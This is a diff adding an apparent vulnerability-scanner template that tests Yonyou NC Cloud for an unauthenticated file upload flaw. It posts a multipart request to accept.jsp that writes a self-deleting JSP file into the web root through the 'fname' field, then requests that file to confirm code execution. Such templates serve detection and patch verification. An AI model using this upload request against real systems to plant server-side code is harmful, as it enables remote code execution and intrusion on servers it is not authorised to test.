@@ -1,0 +1,56 @@
+id: yonyou_nc_cloud-file_upload
+info:
+  name: Yonyou NC Cloud File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    A file upload vulnerability in Yonyou NC Cloud allows attackers to upload
+    malicious files, potentially leading to remote code execution or unauthorized access.
+  reference:
+    - https://decoded.avast.io/janneduchal/analysis-of-attack-against-national-games-of-china-systems/
+variables:
+  s1: "{{rand_text_alpha(20)}}"
+  s2: "{{rand_text_alpha(20)}}"
+  s3: "{{rand_text_alpha(20)}}"
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/aim/equipmap/accept.jsp"
+    headers:
+      Content-Type: multipart/form-data; boundary=---------------------------16314487820932200903769468567
+    body: |
+      -----------------------------16314487820932200903769468567
+      Content-Disposition: form-data; name="upload"; filename="{{s1}}.txt"
+      Content-Type: text/plain
+
+      <% out.println("{{s2}}"); new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
+      -----------------------------16314487820932200903769468567
+      Content-Disposition: form-data; name="fname"
+
+      \webapps\nc_web\{{s3}}.jsp
+      -----------------------------16314487820932200903769468567--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "afterUpload"
+        part: body
+  - id: verify-upload
+    method: GET
+    path:
+      - "{{BaseURL}}/{{s3}}.jsp"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{s2}}"
+        part: body
